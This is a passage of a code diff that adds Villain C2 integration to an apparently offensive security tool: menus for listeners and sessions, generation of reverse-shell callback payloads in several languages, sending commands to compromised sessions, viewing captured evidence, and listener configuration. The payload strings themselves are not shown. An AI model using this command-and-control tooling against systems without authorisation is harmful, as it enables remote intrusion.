+        
+        if not listeners:
+            self.console.print("[yellow]No active listeners[/yellow]")
+            return
+            
+        table = Table(title="Active Listeners")
+        table.add_column("Listener ID", style="cyan")
+        table.add_column("Interface", style="magenta")
+        table.add_column("Port", style="yellow")
+        table.add_column("Status", style="green")
+        table.add_column("Connections", style="blue")
+        table.add_column("Start Time", style="white")
+        
+        for listener_id, info in listeners.items():
+            table.add_row(
+                listener_id,
+                info.get("interface", "N/A"),
+                str(info.get("port", "N/A")),
+                info.get("status", "N/A"),
+                str(info.get("connections", 0)),
+                info.get("start_time", "N/A")
+            )
+            
+        self.console.print(table)
+        
+    def _view_sessions(self):
+        """View active sessions"""
+        sessions = self.villain_manager.get_active_sessions()
+        
+        if not sessions:
+            self.console.print("[yellow]No active sessions[/yellow]")
+            return
+            
+        table = Table(title="Active Sessions")
+        table.add_column("Session ID", style="cyan")
+        table.add_column("Client IP", style="magenta")
+        table.add_column("Client Port", style="yellow")
+        table.add_column("Status", style="green")
+        table.add_column("Commands", style="blue")
+        table.add_column("Start Time", style="white")
+        
+        for session_id, info in sessions.items():
+            table.add_row(
+                session_id,
+                info.get("client_ip", "N/A"),
+                str(info.get("client_port", "N/A")),
+                info.get("status", "N/A"),
+                str(len(info.get("commands_executed", []))),
+                info.get("start_time", "N/A")
+            )
+            
+        self.console.print(table)
+        
+    def _generate_callback_payloads(self):
+        """Generate and display callback payloads"""
+        payload_type = Prompt.ask("Select payload type", 
+                                choices=["bash", "python", "nc", "powershell", "php", "perl", "ruby"],
+                                default="bash")
+        
+        payloads = self.villain_manager.generate_callback_payloads(payload_type)
+        
+        if payloads:
+            self.console.print(f"\n[bold blue]{payload_type.title()} Callback Payloads[/bold blue]")
+            
+            for name, payload in payloads.items():
+                panel = Panel(payload, title=name, style="cyan")
+                self.console.print(panel)
+        else:
+            self.console.print("[yellow]No payloads generated[/yellow]")
+            
+    def _execute_command_on_session(self):
+        """Execute command on an active session"""
+        sessions = self.villain_manager.get_active_sessions()
+        
+        if not sessions:
+            self.console.print("[yellow]No active sessions[/yellow]")
+            return
+            
+        # Show available sessions
+        self.console.print("\n[bold blue]Available Sessions:[/bold blue]")
+        for session_id, info in sessions.items():
+            self.console.print(f"  {session_id} - {info.get('client_ip', 'N/A')}")
+            
+        session_id = Prompt.ask("Enter session ID")
+        
+        if session_id not in sessions:
+            self.console.print("[red]Invalid session ID[/red]")
+            return
+            
+        command = Prompt.ask("Enter command to execute")
+        
+        success = self.villain_manager.execute_command_on_session(session_id, command)
+        
+        if success:
+            self.console.print(f"[green]Command sent to session {session_id}[/green]")
+        else:
+            self.console.print("[red]Failed to execute command[/red]")
+            
+    def _view_evidence(self):
+        """View captured evidence"""
+        evidence_dir = "villain/evidence"
+        
+        if not os.path.exists(evidence_dir):
+            self.console.print("[yellow]No evidence directory found[/yellow]")
+            return
+            
+        evidence_files = [f for f in os.listdir(evidence_dir) if f.endswith(('.json', '.html'))]
+        
+        if not evidence_files:
+            self.console.print("[yellow]No evidence files found[/yellow]")
+            return
+            
+        self.console.print("\n[bold blue]Evidence Files:[/bold blue]")
+        for i, filename in enumerate(evidence_files, 1):
+            self.console.print(f"  [{i}] {filename}")
+            
+        try:
+            choice = int(Prompt.ask("Select file to view (number)")) - 1
+            
+            if 0 <= choice < len(evidence_files):
+                filepath = os.path.join(evidence_dir, evidence_files[choice])
+                
+                if filepath.endswith('.json'):
+                    with open(filepath, 'r') as f:
+                        data = json.load(f)
+                    self.console.print(Panel(json.dumps(data, indent=2), title=evidence_files[choice]))
+                else:
+                    self.console.print(f"[cyan]HTML Report: {filepath}[/cyan]")
+                    
+            else:
+                self.console.print("[red]Invalid selection[/red]")
+        except ValueError:
+            self.console.print("[red]Invalid number[/red]")
+            
+    def _stop_listener(self):
+        """Stop a listener"""
+        listeners = self.villain_manager.get_active_listeners()
+        
+        if not listeners:
+            self.console.print("[yellow]No active listeners[/yellow]")
+            return
+            
+        self.console.print("\n[bold blue]Active Listeners:[/bold blue]")
+        for listener_id, info in listeners.items():
+            self.console.print(f"  {listener_id} - {info.get('interface', 'N/A')}:{info.get('port', 'N/A')}")
+            
+        listener_id = Prompt.ask("Enter listener ID to stop")
+        
+        success = self.villain_manager.stop_listener(listener_id)
+        
+        if success:
+            self.console.print(f"[green]Listener {listener_id} stopped[/green]")
+        else:
+            self.console.print("[red]Failed to stop listener or listener not found[/red]")
+            
     def configuration(self):
         """Configuration menu"""
         while True:
             self.config_menu()
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6"])
+            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7"])
             
             if choice == "1":
                 depth = Prompt.ask("Scan Depth", choices=["quick", "normal", "deep", "thorough"], default=self.config["scanning"]["depth"])
@@ -2993,7 +3720,67 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
                 save_config(self.config)
                 self.console.print(f"[green]Reporting format set to: {format}[/green]")
             elif choice == "6":
+                self._configure_villain()
+            elif choice == "7":
                 break
+                
+    def _configure_villain(self):
+        """Configure Villain C2 settings"""
+        self.console.print("\n[bold blue]Villain C2 Configuration[/bold blue]")
+        
+        current_enabled = self.config.get("villain", {}).get("enabled", False)
+        enabled = Confirm.ask("Enable Villain C2 framework?", default=current_enabled)
+        
+        if not enabled:
+            if "villain" not in self.config:
+                self.config["villain"] = {}
+            self.config["villain"]["enabled"] = False
+            save_config(self.config)
+            self.console.print("[yellow]Villain C2 framework disabled[/yellow]")
+            return
+        
+        # Initialize villain config if not exists
+        if "villain" not in self.config:
+            self.config["villain"] = {
+                "enabled": True,
+                "default_host": "0.0.0.0",
+                "default_port": 4444,
+                "callback_url": "http://127.0.0.1:4444",
+                "auto_start_listener": True,
+                "evidence_capture": True,
+                "session_timeout": 300
+            }
+        
+        villain_config = self.config["villain"]
+        villain_config["enabled"] = True
+        
+        # Configure settings
+        host = Prompt.ask("Default listener host", default=villain_config.get("default_host", "0.0.0.0"))
+        port = int(Prompt.ask("Default listener port", default=str(villain_config.get("default_port", 4444))))
+        callback_url = Prompt.ask("Callback URL", default=f"http://{host}:{port}")
+        auto_start = Confirm.ask("Auto-start listener?", default=villain_config.get("auto_start_listener", True))
+        evidence_capture = Confirm.ask("Enable evidence capture?", default=villain_config.get("evidence_capture", True))
+        
+        villain_config.update({
+            "default_host": host,
+            "default_port": port,
+            "callback_url": callback_url,
+            "auto_start_listener": auto_start,
+            "evidence_capture": evidence_capture
+        })
+        
+        save_config(self.config)
+        self.console.print("[green]Villain C2 configuration saved[/green]")
+        
+        # Reinitialize villain manager if needed
+        if enabled and not self.villain_manager:
+            self.villain_manager = VillainManager(self.config, self.logger)
+            self.payload_generator = PayloadGenerator(self.config, self.logger, self.seclists_manager, self.villain_manager)
+            self.orchestrator = JudgementOrchestrator(
+                self.config, self.logger, self.db_manager, 
+                self.wordlist_manager, self.payload_generator, self.villain_manager
+            )
+            self.console.print("[green]Villain C2 framework initialized[/green]")
 
 def main():
     """Main execution function"""
